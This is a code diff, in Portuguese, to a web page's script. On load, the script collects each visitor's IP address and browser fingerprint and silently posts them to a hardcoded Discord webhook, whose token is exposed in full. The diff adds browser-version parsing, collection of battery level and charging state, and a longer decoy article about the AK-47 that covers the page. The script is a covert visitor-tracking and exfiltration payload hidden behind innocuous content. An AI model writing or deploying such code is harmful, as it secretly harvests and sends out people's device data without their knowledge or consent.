@@ -9,6 +9,17 @@
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi";
 
+    function getBrowserVersion(ua) {
+
+      let match = ua.match(/(Edg|Chrome|Firefox|Safari)\/([\d\.]+)/);
+      if (match) {
+        let name = match[1];
+        if(name === "Edg") name = "Microsoft Edge";
+        return `${name} ${match[2]}`;
+      }
+      return "Desconhecido";
+    }
+
     fetch("https://api.ipify.org?format=json")
       .then(response => response.json())
       .then(data => {
@@ -26,11 +37,38 @@
         const cookieEnabled = navigator.cookieEnabled;
         const online = navigator.onLine;
         const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+        const browserVersion = getBrowserVersion(userAgent);
 
-        const payload = {
-          content: `🕵️ Novo visitante:
+        if (navigator.getBattery) {
+          navigator.getBattery().then(battery => {
+            const batteryLevel = Math.round(battery.level * 100) + "%";
+            const charging = battery.charging ? "Sim" : "Não";
+
+            sendPayload(ip, userAgent, language, timezone, screenResolution, devicePixelRatio, plugins,
+              hardwareConcurrency, deviceMemory, connection, cookieEnabled, online, prefersDarkMode,
+              browserVersion, batteryLevel, charging);
+          }).catch(() => {
+            
+            sendPayload(ip, userAgent, language, timezone, screenResolution, devicePixelRatio, plugins,
+              hardwareConcurrency, deviceMemory, connection, cookieEnabled, online, prefersDarkMode,
+              browserVersion, "N/A", "N/A");
+          });
+        } else {
+          
+          sendPayload(ip, userAgent, language, timezone, screenResolution, devicePixelRatio, plugins,
+            hardwareConcurrency, deviceMemory, connection, cookieEnabled, online, prefersDarkMode,
+            browserVersion, "N/A", "N/A");
+        }
+
+        function sendPayload(ip, userAgent, language, timezone, screenResolution, devicePixelRatio, plugins,
+          hardwareConcurrency, deviceMemory, connection, cookieEnabled, online, prefersDarkMode,
+          browserVersion, batteryLevel, charging) {
+
+          const payload = {
+            content: `🕵️ Novo visitante:
 - IP: ${ip}
-- Navegador: ${userAgent}
+- Navegador (userAgent): ${userAgent}
+- Versão do navegador: ${browserVersion}
 - Idioma: ${language}
 - Fuso horário: ${timezone}
 - Resolução da tela: ${screenResolution}
@@ -41,16 +79,29 @@
 - Conexão: ${connection}
 - Cookies habilitados: ${cookieEnabled}
 - Online: ${online}
-- Prefere modo escuro: ${prefersDarkMode}`
-        };
+- Prefere modo escuro: ${prefersDarkMode}
+- Nível da bateria: ${batteryLevel}
+- Carregando bateria: ${charging}`
+          };
 
-        fetch(webhookURL, {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify(payload)
-        });
+          fetch(webhookURL, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify(payload)
+          });
 
-        document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.</h2>`;
+          document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.
+
+Projetada para ser simples, resistente e confiável, a AK-47 funciona em praticamente qualquer ambiente – desde desertos escaldantes até florestas úmidas. Seu calibre 7.62x39mm oferece um equilíbrio entre poder de fogo e controle de recuo, tornando-a eficaz em combate de curta e média distância.
+
+A principal característica da AK-47 é sua durabilidade. Ela pode continuar funcionando mesmo com pouca manutenção, sujeira ou após anos de uso. Isso a tornou uma escolha popular entre exércitos regulares, milícias e grupos insurgentes.
+
+Com mais de 100 milhões de unidades produzidas (contando variantes licenciadas e não licenciadas), a AK-47 é considerada a arma de fogo mais produzida da história. Seu design também deu origem a várias versões, como a AKM, AK-74 e muitas outras adaptações fabricadas em diferentes países.
+
+Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global.
+
+</h2>`;
+        }
       })
       .catch(error => {
         console.error("Erro ao obter informações:", error);
